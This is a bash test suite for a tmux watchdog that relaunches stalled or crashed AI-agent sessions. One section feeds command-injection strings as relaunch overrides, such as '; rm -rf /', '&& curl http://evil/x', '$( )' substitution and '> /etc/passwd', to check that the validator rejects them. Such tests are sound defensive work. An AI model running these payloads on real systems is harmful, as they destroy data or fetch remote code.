#!/usr/bin/env bash
#
# DoD 再現テスト — shogun_bash_fallback_watchdog.sh
#
# 由来: subtask_thirdpc_shogun_bash_fallback_watchdog (副院長追命 670ffbfe(2))。
# 偽 green 厳禁・real 証跡: 実 tmux fixture pane で (A) bash 落ち + (B) stuck 再現 →
# watchdog 検知 → relaunch → alive 実証 + 冪等 + 再起動上限 escalate を機械検証する。
#
# 実行: bash scripts/watchdogs/test_shogun_bash_fallback_watchdog.sh
# 終了コード: 0 = 全 PASS、1 = いずれか FAIL
#
# 安全: DD-169 順守で tmux kill-session を一切使わない (fixture は exit で自然終了)。
#       DB は SBW_NO_DB=1 で全 skip、relaunch は無害な stand-in command に差替。

set -uo pipefail
cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")/../.." || exit 1

WD=scripts/watchdogs/shogun_bash_fallback_watchdog.sh
PASS=0; FAIL=0
ok() { echo "  PASS: $1"; PASS=$((PASS+1)); }
ng() { echo "  FAIL: $1"; FAIL=$((FAIL+1)); }
t_eq()    { if [ "$1" = "$2" ]; then ok "$3"; else ng "$3 (got='$1' want='$2')"; fi; }
t_grep()  { if printf '%s' "$1" | grep -q "$2"; then ok "$3"; else ng "$3"; fi; }
t_ngrep() { if printf '%s' "$1" | grep -q "$2"; then ng "$3"; else ok "$3"; fi; }

TMP=$(mktemp -d /tmp/sbw_test.XXXXXX)
trap 'rm -rf "$TMP"' EXIT

echo "════ 0. shellcheck ════"
if command -v shellcheck >/dev/null 2>&1; then
  if shellcheck "$WD" >/dev/null 2>&1; then ok "shellcheck green"; else ng "shellcheck issues"; shellcheck "$WD"; fi
else
  if bash -n "$WD"; then ok "bash -n (shellcheck absent)"; else ng "bash -n syntax error"; fi
fi

# ─── classification fixtures ───
cat > "$TMP/cap_A.txt" <<'EOF'
[大将軍標準編成] 将軍-third / claude
hakudokai@momizi-dx:~/multi-agent-shogun$ inbox3
inbox3: command not found
hakudokai@momizi-dx:~/multi-agent-shogun$
EOF
cat > "$TMP/cap_B.txt" <<'EOF'
● Calling the model...
  ⎿  API Error: 529 overloaded_error · Retrying… attempt 4/10
─────────────────────────────────────────────
 ❯
─────────────────────────────────────────────
  ⏵⏵ bypass permissions on (shift+tab to cycle)   esc to interrupt
EOF
cat > "$TMP/cap_H.txt" <<'EOF'
● I'll read the file now.
  ⎿  Read 40 lines
─────────────────────────────────────────────
 ❯ continue with the task
─────────────────────────────────────────────
  ⏵⏵ bypass permissions on   esc to interrupt   ? for shortcuts
EOF
: > "$TMP/cap_E.txt"

cls() { SBW_CLASSIFY_ONLY=1 SBW_NO_DB=1 SBW_CAPTURE_FILE="$1" SBW_PANE_CMD_OVERRIDE="$2" \
  SBW_PANE_TARGET=x:0.0 SBW_SESSION_NAME=x SBW_ROLE_NAME=t bash "$WD" 2>/dev/null; }

echo "════ 1. classification (capture-content 主, doppler mask 耐性) ════"
t_eq "$(cls "$TMP/cap_A.txt" bash)"    "A"       "A: bash-fallback"
t_eq "$(cls "$TMP/cap_B.txt" node)"    "B"       "B: stuck-retry"
t_eq "$(cls "$TMP/cap_H.txt" node)"    "HEALTHY" "HEALTHY (working)"
t_eq "$(cls "$TMP/cap_E.txt" bash)"    "EMPTY"   "EMPTY"
t_eq "$(cls "$TMP/cap_H.txt" doppler)" "HEALTHY" "doppler-mask healthy≠A"
t_eq "$(cls "$TMP/cap_B.txt" doppler)" "B"       "doppler-mask stuck=B"

echo "════ 2. (B) persistence (STUCK_MIN→300s, NOW 注入で決定的) ════"
LD="$TMP/persist"
pr() { SBW_NO_DB=1 SBW_DRY_RUN=1 SBW_PANE_TARGET=x:0.0 SBW_SESSION_NAME=x SBW_ROLE_NAME=t \
  SBW_CAPTURE_FILE="$TMP/cap_B.txt" SBW_PANE_CMD_OVERRIDE=node SBW_LOG_DIR="$LD" SBW_NOW_EPOCH="$1" bash "$WD" 2>&1; }
t_grep "$(pr 1000)" 'reset timer'          "run1 first-sighting defer"
t_grep "$(pr 1060)" 'not yet persistent'   "run2 +60s defer"
t_grep "$(pr 1360)" 'RELAUNCH'             "run3 +360s fires"

echo "════ 3. idempotency (MODE A 連続 run = relaunch 1 回) ════"
LD="$TMP/idem"
ir() { SBW_NO_DB=1 SBW_DRY_RUN=1 SBW_PANE_TARGET=x:0.0 SBW_SESSION_NAME=x SBW_ROLE_NAME=t \
  SBW_CAPTURE_FILE="$TMP/cap_A.txt" SBW_PANE_CMD_OVERRIDE=bash SBW_LOG_DIR="$LD" bash "$WD" 2>&1; }
ir >/dev/null
t_grep "$(ir)" 'idempotency' "run2 skipped (flag)"
t_eq "$(wc -l < "$LD/restarts.log")" "1" "relaunch count == 1"

echo "════ 4. restart cap → human_required escalate (relaunch 無) ════"
LD="$TMP/cap"; mkdir -p "$LD"; printf '%s\n' 5000 5010 5020 > "$LD/restarts.log"
cr=$(SBW_NO_DB=1 SBW_DRY_RUN=1 SBW_PANE_TARGET=x:0.0 SBW_SESSION_NAME=x SBW_ROLE_NAME=t \
  SBW_CAPTURE_FILE="$TMP/cap_A.txt" SBW_PANE_CMD_OVERRIDE=bash SBW_LOG_DIR="$LD" SBW_NOW_EPOCH=5100 \
  SBW_RESTART_CAP=3 bash "$WD" 2>&1)
t_grep  "$cr" 'HALT'     "cap exceeded → HALT"
t_grep  "$cr" 'escalate' "cap exceeded → escalate"
t_ngrep "$cr" 'RELAUNCH' "no relaunch over cap"
t_eq "$(wc -l < "$LD/restarts.log")" "3" "restarts.log unchanged (3)"

echo "════ 5. manual disable flag 尊重 ════"
LD="$TMP/disable"; mkdir -p "$LD"; touch "$LD/DISABLE"
dr=$(SBW_NO_DB=1 SBW_PANE_TARGET=x:0.0 SBW_SESSION_NAME=x SBW_ROLE_NAME=t \
  SBW_CAPTURE_FILE="$TMP/cap_A.txt" SBW_PANE_CMD_OVERRIDE=bash SBW_LOG_DIR="$LD" bash "$WD" 2>&1)
t_grep "$dr" 'manual disable' "DISABLE flag halts watchdog"

# ─── RELAUNCH_CMD strict 検証 (cycle4 RED① + cycle5 RED①: injection/env-gap 遮断) ───
echo "════ 5b. RELAUNCH_CMD strict invariant (metachar injection 遮断) ════"
LD="$TMP/relaunch"
# MODE A・DRY_RUN で resolved RELAUNCH_CMD を log から観測 (★RELAUNCH★ cmd=… 行)
rl() { local allow=""; [ -n "${3:-}" ] && allow="SBW_RELAUNCH_ALLOW_UNSAFE=1"
  env SBW_NO_DB=1 SBW_DRY_RUN=1 SBW_PANE_TARGET=x:0.0 SBW_SESSION_NAME=x SBW_ROLE_NAME=t \
  SBW_CAPTURE_FILE="$TMP/cap_A.txt" SBW_PANE_CMD_OVERRIDE=bash SBW_LOG_DIR="$LD/$1" \
  SBW_RELAUNCH_CMD="$2" $allow bash "$WD" 2>&1; }
# 実際に relaunch される cmd は ★RELAUNCH★ 行のみ (warn 行 'SBW_RELAUNCH_CMD…' は rejected
# override を証跡で含むので 'RELAUNCH' 部分一致では誤拾い → ★RELAUNCH★ glyph で厳密に絞る)
rline() { printf '%s\n' "$1" | grep '★RELAUNCH★'; }
# fallback 採用 = ★RELAUNCH★ 行が doppler-safe default を指す かつ injection payload を含まない事
# を 1 関数で検証 ($1=full out, $2=payload-marker, $3=label)
assert_fellback() { local rl_line; rl_line="$(rline "$1")"
  t_grep  "$1" 'NOT a strict'                "$3: warn (strict 検証 fail)"
  t_grep  "$rl_line" 'doppler run --project openhands' "$3: fallback=doppler-safe default 採用"
  t_ngrep "$rl_line" "$2"                    "$3: injection payload は relaunch されない"; }
# (a) bare claude override (env-gap) → fallback
assert_fellback "$(rl bare "claude --permission-mode auto")" 'cmd=claude' "5b bare claude"
# (b) ; separator injection (★cycle4 部分一致では validated 漏れだった核心ケース★) → fallback
assert_fellback "$(rl semi 'doppler run --project openhands --config dev -- claude ; rm -rf /')" 'rm -rf' "5b ';' injection"
# (c) && chaining injection → fallback
assert_fellback "$(rl andand 'doppler run -- claude && curl http://evil/x')" 'curl http' "5b '&&' chaining"
# (d) | pipe injection → fallback
assert_fellback "$(rl pipe 'doppler run -- claude | tee /tmp/x')" 'tee /tmp' "5b '|' pipe"
# (e) \$( ) command substitution → fallback
assert_fellback "$(rl subsh 'doppler run -- claude $(touch /tmp/pwn)')" 'touch /tmp' "5b '\$(' subshell"
# (f) backtick substitution → fallback
assert_fellback "$(rl btick 'doppler run -- claude `id`')" 'id' "5b backtick"
# (g) > redirect injection → fallback
assert_fellback "$(rl redir 'doppler run -- claude > /etc/passwd')" '/etc/passwd' "5b '>' redirect"
# (h) & background injection → fallback
assert_fellback "$(rl bg 'doppler run -- claude & wget evil')" 'wget evil' "5b '&' background"
# (i) 先頭が doppler run でない (anchored) → fallback
assert_fellback "$(rl prefix 'PWNED=1 doppler run -- claude')" 'PWNED' "5b non-anchored prefix"
# (j) 正当な bare doppler … claude override → 尊重 (fallback しない)
SAFE='doppler run --project openhands --config dev -- claude --permission-mode auto'
out_safe=$(rl safe "$SAFE")
t_grep  "$out_safe" 'override validated'        "5b bare doppler+claude override → validated"
t_ngrep "$out_safe" 'fallback to doppler-safe'  "5b 正当 override は fallback しない"
t_grep  "$(rline "$out_safe")" 'permission-mode auto' "5b 正当 override がそのまま relaunch される"
# (k) 明示 SBW_RELAUNCH_ALLOW_UNSAFE=1 → unsafe(metachar 含む) でも尊重 (escape hatch)
out_optin=$(rl optin "echo standin && cat" 1)
t_grep "$out_optin" 'unsafe opt-in'             "5b ALLOW_UNSAFE=1 → unsafe override 尊重"
t_grep "$out_optin" 'RELAUNCH.* cmd=echo standin && cat' "5b opt-in は override をそのまま使用"

# ─── stuck fingerprint 安定性 (cycle4 RED②: spinner glyph/語/counter 不変化) ───
echo "════ 5c. stuck fingerprint 安定性 (spinner 変動耐性) ════"
fp() { SBW_FINGERPRINT_PROBE="$1" SBW_NO_DB=1 SBW_PANE_TARGET=x:0.0 SBW_SESSION_NAME=x \
  SBW_ROLE_NAME=t bash "$WD" 2>/dev/null; }
# 同一 stuck 状態の 2 spinner フレーム: glyph アニメ・rotating gerund・経過秒・attempt 番号が
# すべて変動するが進捗は 0。★同一 fingerprint★ でなければ persistence に到達できない。
printf '⠋ Crunching… (12s · esc to interrupt)\n  ⎿ API Error: 529 overloaded_error · Retrying… attempt 4/10\n' > "$TMP/fp_f1.txt"
printf '⠙ Zigzagging… (73s · esc to interrupt)\n  ⎿ API Error: 529 overloaded_error · Retrying… attempt 5/10\n' > "$TMP/fp_f2.txt"
# 真の進捗 (assistant 実出力が変化) → fingerprint も変化 (timer reset = 誤発火防止)
printf '⠹ Crunching… (90s · esc to interrupt)\n  ⎿ Read 200 lines from karte_visit_manager.py\n  Now editing line 123\n' > "$TMP/fp_prog.txt"
t_eq "$(fp "$TMP/fp_f1.txt")" "$(fp "$TMP/fp_f2.txt")" "5c spinner 2 フレーム同一 stuck → 同一 fp (persistence 到達可)"
if [ "$(fp "$TMP/fp_f1.txt")" != "$(fp "$TMP/fp_prog.txt")" ]; then
  ok "5c 進捗あり → fp 変化 (timer reset = 誤発火防止、over-normalize でない)"
else
  ng "5c 進捗あっても fp 同一 (over-normalize 疑い)"
fi
# 実 persistence でも spinner 変動を跨いで発火する事を pin (frame 跨ぎ STUCK_STATE 永続)
LD="$TMP/persist2"
pr2() { SBW_NO_DB=1 SBW_DRY_RUN=1 SBW_PANE_TARGET=x:0.0 SBW_SESSION_NAME=x SBW_ROLE_NAME=t \
  SBW_RELAUNCH_ALLOW_UNSAFE=1 SBW_RELAUNCH_CMD='doppler run -- claude' \
  SBW_CAPTURE_FILE="$1" SBW_PANE_CMD_OVERRIDE=node SBW_LOG_DIR="$LD" SBW_NOW_EPOCH="$2" bash "$WD" 2>&1; }
t_grep "$(pr2 "$TMP/fp_f1.txt" 2000)" 'reset timer'        "5c frame1 first-sighting defer"
t_grep "$(pr2 "$TMP/fp_f2.txt" 2120)" 'not yet persistent' "5c frame2 (spinner 変動) fp 不変→timer 継続"
t_grep "$(pr2 "$TMP/fp_f2.txt" 2360)" 'RELAUNCH'           "5c +360s で発火 (spinner 変動を跨ぎ persistence 成立)"

# ─── live tmux e2e ───
e2e_one() {
  # $1=session $2=setup-cmd $3=role $4=marker $5=mode-label
  local S="$1" setup="$2" role="$3" marker="$4" lbl="$5"
  local LD="$TMP/e2e_$S" cap
  tmux new-session -d -s "$S" -x 200 -y 50 -n f 2>/dev/null
  sleep 0.5
  tmux send-keys -t "$S":f.0 "$setup" Enter
  sleep 1
  # 2 回 run: MODE B は persistence で 2 回目に発火 (MODE A は冪等 flag で 2 回目 skip)
  for _ in 1 2; do
    SBW_NO_DB=1 SBW_BOOT_DELAY_SEC=2 SBW_STUCK_MIN=0 \
      SBW_RELAUNCH_CMD="echo $marker && cat" SBW_RELAUNCH_ALLOW_UNSAFE=1 \
      SBW_KICKOFF_TEXT="KICK_$marker" \
      SBW_PANE_TARGET="$S":f.0 SBW_SESSION_NAME="$S" SBW_ROLE_NAME="$role" SBW_LOG_DIR="$LD" \
      bash "$WD" >/dev/null 2>&1
    sleep 1
  done
  cap=$(tmux capture-pane -t "$S":f.0 -p -S -20 2>/dev/null)
  # teardown (exit, no kill-session = DD-169 順守)
  tmux send-keys -t "$S":f.0 C-c 2>/dev/null; sleep 0.2
  tmux send-keys -t "$S":f.0 "exit" Enter 2>/dev/null; sleep 0.3
  if printf '%s' "$cap" | grep -q "$marker" && printf '%s' "$cap" | grep -q "KICK_$marker"; then
    ok "e2e $lbl: relaunch executed + kickoff delivered"
  else
    ng "e2e $lbl: relaunch/kickoff (capture tail below)"; printf '%s\n' "$cap" | tail -8
  fi
}

echo "════ 6. tmux e2e preflight (cycle4 RED③: SKIP=FAIL, skip-as-pass 禁) ════"
# negative test: tmux 不在を PATH 隠蔽で擬似再現 → preflight は ★fail を返さねばならない★
# (前提を満たせない時を「成功」扱いにしない = SKIP=FAIL 原則の機械 pin)
if ( PATH=/nonexistent-sbw; command -v tmux >/dev/null 2>&1 ); then
  ng "negative: tmux 不在擬似で preflight が present 判定 (skip-as-pass 漏れ)"
else
  ok "negative: tmux 不在擬似で preflight=fail (SKIP=FAIL 順守)"
fi
# 本番 preflight: tmux 不在なら live e2e は ★実行不能=FAIL★ (旧版の skip-as-pass を撤廃)
if ! command -v tmux >/dev/null 2>&1; then
  ng "tmux preflight: tmux 不在ゆえ live e2e 実行不能 (前提未充足=FAIL、成功扱い禁)"
else
  ok "tmux preflight: tmux present → live e2e 実行"
  echo "════ 6a. live tmux e2e (A: bash-fallback) ════"
  e2e_one sbwt_A "echo '[大将軍標準編成] 将軍-test / claude'; inbox3" t-a SBW_A_OK "MODE A"
  echo "════ 6b. live tmux e2e (B: stuck-retry → interrupt+relaunch) ════"
  e2e_one sbwt_B \
    $'printf \'\\u25cf model...\\n  Retrying\\u2026 attempt 4/10\\n \\u276f\\n  esc to interrupt\\n\'; sleep 600' \
    t-b SBW_B_OK "MODE B"
fi

# ─── pane-not-freed: 無限抑止しない / cap で escalate (cycle5 RED②) ───
echo "════ 7. pane-not-freed: flag 抑止せず retry / cap で human_required (cycle5 RED②) ════"
LD="$TMP/notfreed"; mkdir -p "$LD"
nf() { SBW_NO_DB=1 SBW_PANE_TARGET=x:0.0 SBW_SESSION_NAME=x SBW_ROLE_NAME=t \
  SBW_LOG_DIR="$LD" SBW_RESTART_CAP=3 SBW_RESTART_WINDOW_MIN=60 SBW_NOW_EPOCH="$1" \
  SBW_NOT_FREED_PROBE="claude" bash "$WD" 2>&1; }
flag_present() { [ -f "$LD/restart_in_progress.flag" ] && echo y || echo n; }
# run1: free-fail 1/3 → retry, ★抑止源 flag は解除されねばならない (RED② core cure)★
touch "$LD/restart_in_progress.flag"
o1=$(nf 7000)
t_grep "$o1" 'retry next cycle'  "7 run1 (free-fail 1/3) → retry"
t_eq "$(flag_present)" "n"       "7 run1: in-progress flag 解除 (無限抑止 cure)"
t_ngrep "$o1" 'HALT'             "7 run1: cap 未満は escalate しない"
# run2: free-fail 2/3 → retry (flag 再 touch しても解除される)
touch "$LD/restart_in_progress.flag"
o2=$(nf 7060)
t_grep "$o2" 'retry next cycle'  "7 run2 (free-fail 2/3) → retry"
t_eq "$(flag_present)" "n"       "7 run2: flag 解除維持"
# run3: free-fail 3/3 == cap → HALT + human_required escalate (DB handshake 発報)
# (★HALT★ log 自体が "human_required" 語を含む為、実 escalate は handshake INSERT 行で判定)
o3=$(nf 7120)
t_grep "$o3" 'HALT'                 "7 run3 (free-fail 3/3) → HALT"
t_grep "$o3" 'pc_handshake INSERT'  "7 run3 → human_required handshake 発報"
t_grep "$o3" '\[human_required\]'   "7 run3 → handshake topic=human_required"
t_eq "$(wc -l < "$LD/freefails.log")" "3" "7 free-fail 3 件記録"
# run4: cap 超過 → quiet retry (DB spam 抑止、handshake 再発報しない)
o4=$(nf 7180)
t_grep  "$o4" 'quiet retry'         "7 run4 (cap 超過) → quiet retry (escalate 済)"
t_ngrep "$o4" 'pc_handshake INSERT' "7 run4: handshake 再発報せず (heartbeat spam 抑止)"

# ─── MODE B child-TERM 証跡+検証 (cycle2 hardening, 誤TERM防止 real証跡) ───
echo "════ 8. MODE B child-TERM 証跡+検証 (誤TERM防止) ════"
SLEEP_BIN="$(command -v sleep)"
BD="$TMP/termbin"; mkdir -p "$BD/claude_stack"
# comm を制御する為 copy binary を使う (shebang script だと comm=interpreter になる)。
# args への 'claude' 注入は実行 path 経由 (claude_stack/…) で valid sleep 引数を維持。
for n in claude node doppler vite; do cp "$SLEEP_BIN" "$BD/$n"; done
cp "$SLEEP_BIN" "$BD/claude_stack/node"
cp "$SLEEP_BIN" "$BD/claude_stack/doppler"
PIDF="$TMP/term_cpids"; : > "$PIDF"
cat > "$TMP/term_parent.sh" <<EOF
#!/usr/bin/env bash
"$BD/claude" 60 &              echo "claude \$!"      >> "$PIDF"
"$BD/node" 60 &               echo "node_gen \$!"    >> "$PIDF"
"$BD/doppler" 60 &            echo "doppler_gen \$!" >> "$PIDF"
"$BD/vite" 60 &               echo "vite \$!"        >> "$PIDF"
"$BD/claude_stack/node" 60 &     echo "node_cl \$!"    >> "$PIDF"
"$BD/claude_stack/doppler" 60 &  echo "doppler_cl \$!" >> "$PIDF"
exec sleep 60
EOF
chmod +x "$TMP/term_parent.sh"
"$TMP/term_parent.sh" &
PARENT_PID=$!
sleep 0.7
gp() { awk -v k="$1" '$1==k{print $2}' "$PIDF"; }
# alive = process 存在 かつ zombie でない (親=exec sleep は子を reap せぬ為、TERM 済子は
# Z 状態で残り kill -0 を通す。stat で Z を死亡扱いにする)。
av() {
  local st
  st=$(ps -o stat= -p "$1" 2>/dev/null | tr -d ' ')
  if [ -z "$st" ]; then echo 0; return; fi
  case "$st" in Z*) echo 0 ;; *) echo 1 ;; esac
}

# (8a) DRY probe: 証跡 + 検証 decision を log で確認 (実 kill 無)
dprobe=$(SBW_NO_DB=1 SBW_DRY_RUN=1 SBW_PANE_TARGET=x:0.0 SBW_SESSION_NAME=x SBW_ROLE_NAME=t \
  SBW_LOG_DIR="$TMP/term_dry" SBW_MODE_B_TERM_PROBE_PID="$PARENT_PID" bash "$WD" 2>&1)
t_grep "$dprobe" 'ps-evidence'                       "8a 事前 ps 証跡 header 出力"
t_grep "$dprobe" 'ps|'                               "8a 証跡に直系子の ps 行列挙"
t_grep "$dprobe" 'would SIGTERM verified child.*ppid=' "8a 検証 decision に ppid 記録"
nterm=$(printf '%s\n' "$dprobe" | grep -c 'would SIGTERM verified child')
nskip=$(printf '%s\n' "$dprobe" | grep -c 'MODE B skip')
t_eq "$nterm" "3" "8a DRY: claude-stack 3件のみ TERM 対象 (claude+node/claude+doppler/claude)"
t_eq "$nskip" "3" "8a DRY: generic 3件 skip (node/doppler/vite 誤TERM防止)"
t_ngrep "$dprobe" '] SIGTERM verified child'   "8a DRY: 実 SIGTERM log 無 (would のみ)"

# (8b) REAL probe: 検証を通った claude-stack だけ実 TERM、generic は生存 (real証跡)
SBW_NO_DB=1 SBW_DRY_RUN=0 SBW_PANE_TARGET=x:0.0 SBW_SESSION_NAME=x SBW_ROLE_NAME=t \
  SBW_LOG_DIR="$TMP/term_real" SBW_MODE_B_TERM_PROBE_PID="$PARENT_PID" bash "$WD" >/dev/null 2>&1
sleep 1
t_eq "$(av "$(gp claude)")"      "0" "8b REAL: claude 本体 TERMed"
t_eq "$(av "$(gp node_cl)")"     "0" "8b REAL: node(claude args) TERMed"
t_eq "$(av "$(gp doppler_cl)")"  "0" "8b REAL: doppler(claude args) TERMed"
t_eq "$(av "$(gp node_gen)")"    "1" "8b REAL: generic node SURVIVED (誤TERM防止 実証)"
t_eq "$(av "$(gp doppler_gen)")" "1" "8b REAL: generic doppler SURVIVED"
t_eq "$(av "$(gp vite)")"        "1" "8b REAL: generic vite SURVIVED"
# cleanup (単一PID形 TERM、生存分のみ)
kill -TERM "$PARENT_PID" 2>/dev/null || true
for k in node_gen doppler_gen vite; do kill -TERM "$(gp "$k")" 2>/dev/null || true; done

# ─── 孫 (grandchild) claude-stack 再帰検出+停止 (cycle3, doppler→claude 構造) ───
# 由来: cycle3 (Codex 1771c08f) = launch wrapper `doppler run … claude` ゆえ claude は孫。
#       cycle2 の pgrep -P 直系子限定では孫 claude を検出/停止できなかった回帰を pin する。
# 構造: GC_PARENT → [中間 doppler(claude args)] → claude(孫=TERM対象)
#                 → [中間 doppler(generic)]     → node(孫=生存)
echo "════ 9. 孫 claude-stack 再帰検出+停止 (cycle3: pane→doppler→claude) ════"
GBD="$TMP/gcbin"; mkdir -p "$GBD/claude_stack"
for n in claude doppler node; do cp "$SLEEP_BIN" "$GBD/$n"; done
cp "$SLEEP_BIN" "$GBD/claude_stack/doppler"   # 中間: comm=doppler, args に 'claude'
GPIDF="$TMP/gc_pids"; : > "$GPIDF"
# claude 枝: claude 孫を bg → exec で doppler(claude args) 中間に化ける
cat > "$TMP/gc_branch_cl.sh" <<EOF
#!/usr/bin/env bash
"$GBD/claude" 60 &
echo "claude_gc \$!" >> "$GPIDF"
exec "$GBD/claude_stack/doppler" 60
EOF
# generic 枝: node 孫を bg → exec で doppler(generic) 中間に化ける
cat > "$TMP/gc_branch_gen.sh" <<EOF
#!/usr/bin/env bash
"$GBD/node" 60 &
echo "node_gc_gen \$!" >> "$GPIDF"
exec "$GBD/doppler" 60
EOF
chmod +x "$TMP/gc_branch_cl.sh" "$TMP/gc_branch_gen.sh"
cat > "$TMP/gc_parent.sh" <<EOF
#!/usr/bin/env bash
"$TMP/gc_branch_cl.sh" &
echo "branch_cl \$!" >> "$GPIDF"
"$TMP/gc_branch_gen.sh" &
echo "branch_gen \$!" >> "$GPIDF"
exec sleep 60
EOF
chmod +x "$TMP/gc_parent.sh"
"$TMP/gc_parent.sh" &
GC_PARENT_PID=$!
sleep 0.9
ggp() { awk -v k="$1" '$1==k{print $2}' "$GPIDF"; }
GC_CLAUDE=$(ggp claude_gc)

# (9a) DRY probe: 孫 claude が subtree 証跡に出て検証 TERM 対象になる + 直系子ではない事を pin
gdry=$(SBW_NO_DB=1 SBW_DRY_RUN=1 SBW_PANE_TARGET=x:0.0 SBW_SESSION_NAME=x SBW_ROLE_NAME=t \
  SBW_LOG_DIR="$TMP/gc_dry" SBW_MODE_B_TERM_PROBE_PID="$GC_PARENT_PID" bash "$WD" 2>&1)
t_grep  "$gdry" "subtree of pane_pid"                          "9a 証跡 header=subtree (直系子限定撤廃)"
t_grep  "$gdry" "would SIGTERM verified child pid=$GC_CLAUDE "  "9a 孫 claude($GC_CLAUDE) が TERM 対象 (再帰検出)"
t_ngrep "$(pgrep -P "$GC_PARENT_PID" 2>/dev/null)" "^$GC_CLAUDE\$" "9a 孫 claude は直系子でない (cycle2 pgrep -P では不可視)"

# (9b) REAL probe: 孫 claude + claude-args 中間 doppler を TERM、generic 枝は生存
SBW_NO_DB=1 SBW_DRY_RUN=0 SBW_PANE_TARGET=x:0.0 SBW_SESSION_NAME=x SBW_ROLE_NAME=t \
  SBW_LOG_DIR="$TMP/gc_real" SBW_MODE_B_TERM_PROBE_PID="$GC_PARENT_PID" bash "$WD" >/dev/null 2>&1
sleep 1
t_eq "$(av "$(ggp claude_gc)")"    "0" "9b REAL: 孫 claude TERMed (再帰検出→停止)"
t_eq "$(av "$(ggp branch_cl)")"    "0" "9b REAL: 中間 doppler(claude args) TERMed"
t_eq "$(av "$(ggp node_gc_gen)")"  "1" "9b REAL: generic 孫 node SURVIVED (誤TERM防止)"
t_eq "$(av "$(ggp branch_gen)")"   "1" "9b REAL: generic 中間 doppler SURVIVED"
# cleanup (生存分のみ単一PID形 TERM)
kill -TERM "$GC_PARENT_PID" 2>/dev/null || true
for k in branch_gen node_gc_gen; do kill -TERM "$(ggp "$k")" 2>/dev/null || true; done

echo
echo "════════════ RESULT: PASS=$PASS FAIL=$FAIL ════════════"
if [ "$FAIL" -eq 0 ]; then echo "ALL GREEN"; exit 0; else echo "FAILURES PRESENT"; exit 1; fi
